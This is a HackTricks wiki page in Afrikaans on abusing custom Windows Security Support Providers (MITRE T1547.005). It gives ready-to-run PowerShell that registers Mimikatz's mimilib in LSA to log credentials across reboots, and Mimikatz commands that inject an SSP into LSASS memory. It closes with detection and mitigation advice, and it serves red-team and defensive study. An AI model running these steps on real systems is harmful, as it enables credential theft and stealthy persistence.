# Pasgemaakte Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) is DLL-gebaseerde sekuriteitspakkette wat deur die Local Security Authority (LSA) gelaai word. Windows registreer pasgemaakte SSP/AP-DLL's deur die `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` `REG_MULTI_SZ`-waarde en laai geregistreerde pakkette wanneer die stelsel begin.<sup>[[1]](#references)</sup>

Omdat SSP's in LSA loop en geloofsbriewe kan ontvang, kan aanvallers 'n kwaadwillige pakket misbruik vir toegang tot geloofsbriewe en persistence. MITRE volg hierdie gedrag as T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz sluit `mimilib.dll` in, wat 'n SSP implementeer wat geloofsbriewe aanteken nadat dit gelaai is. Plaas in 'n gemagtigde lab die DLL wat by die teikenargitektuur pas in `C:\Windows\System32`, en inspekteer dan die huidige pakketlys voordat jy dit verander.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
'n Tipiese bestaande waarde kan pakkette soos `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` en `pku2u` bevat. Behou elke bestaande inskrywing wanneer jy die custom package byvoeg.<sup>[[1]](#references)</sup>

Voeg `mimilib` by sonder om die bestaande pakkette te vervang:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Na ’n herlaai word die pakket in LSA gelaai, en daaropvolgende vasgelegde credentials word deur hierdie implementering na `C:\Windows\System32\kiwissp.log` geskryf.<sup>[[2]](#references)[[3]](#references)</sup>

## Lading in geheue

Mimikatz kan ook sy SSP-implementering in die huidige LSASS-proses inspuit:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Hierdie metode bly nie behoue na 'n herlaai nie.<sup>[[2]](#references)[[3]](#references)</sup>

## Opsporing en versagting

Monitor veranderinge aan `...\Lsa\Security Packages` en onverwagte DLL-ladings in `lsass.exe`. Security event 4657 teken slegs 'n register-**waarde**-wysiging aan wanneer die relevante Audit Registry-beleid en SACL gekonfigureer is.<sup>[[2]](#references)[[4]](#references)</sup>

Waar dit versoenbaar is, aktiveer bykomende LSA-beskerming en ondersoek ongetekende of onverwagte SSP DLL's. Microsoft dokumenteer LSA-beskerming spesifiek as 'n beheermaatreël teen kode-inspuiting wat geloofsbriewe kan kompromitteer.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Registrasie van SSP/AP DLL's](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Mimikatz-bewaarplek - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Sekuriteitsgebeurtenis 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Konfigureer bykomende LSA-beskerming](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
